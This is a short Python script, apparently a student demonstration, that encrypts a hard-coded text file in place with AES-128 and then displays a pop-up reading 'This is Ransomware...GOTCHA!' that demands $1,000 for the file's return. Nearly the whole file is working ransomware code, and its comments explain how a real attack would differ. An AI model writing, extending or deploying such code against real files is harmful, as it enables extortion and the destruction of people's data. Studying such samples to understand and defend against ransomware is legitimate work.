# -*- coding: utf-8 -*-
"""
Created on Thu Mar 28 18:27:01 2019

@author: Kelli
"""

#This code will encrypt a .txt file using AES_128 encryption and some user defined 
# key. Obviously in a real ransomware attack this code would be executed in such a way that the physical 
#key and seed were NOT hard coded but for demonstration purposes and simplicity is it kept in the actual code

#imports 
import ctypes  # An included library with Python install.
from Crypto.Cipher import AES
filename = "/Users/Kelli/Documents/Hello_World.txt"#in actual ransom ware this would be automatically populated
key = "abcdefghi"#just using this key for demonstration purposes
key = key.zfill(16)
cipher = AES.new(key, AES.MODE_ECB)

import Tkinter#included library in order to create the dialog box
import tkMessageBox#actual dialog box
 
#Read in current text from file
with open(filename, 'r') as original: data = original.read()
#make the input string be divisble by 16 so that AES128 will work
while len(data)%16 != 0:#while loop to pad the text
    data = data + "0"#append a simple 0 as a padding
#encode it so it is encrypted
data = cipher.encrypt(data)#Encrypted as binary
#Export to filename
with open(filename, 'wb') as modified: modified.write(data)#this opens the file and exports the encrypted string to the previous text

#This prints a pop us message
tkMessageBox.showinfo("This is Ransomware...GOTCHA!", "Please pay $1,000.00 to get your file back!")#content that appears in the dialog box
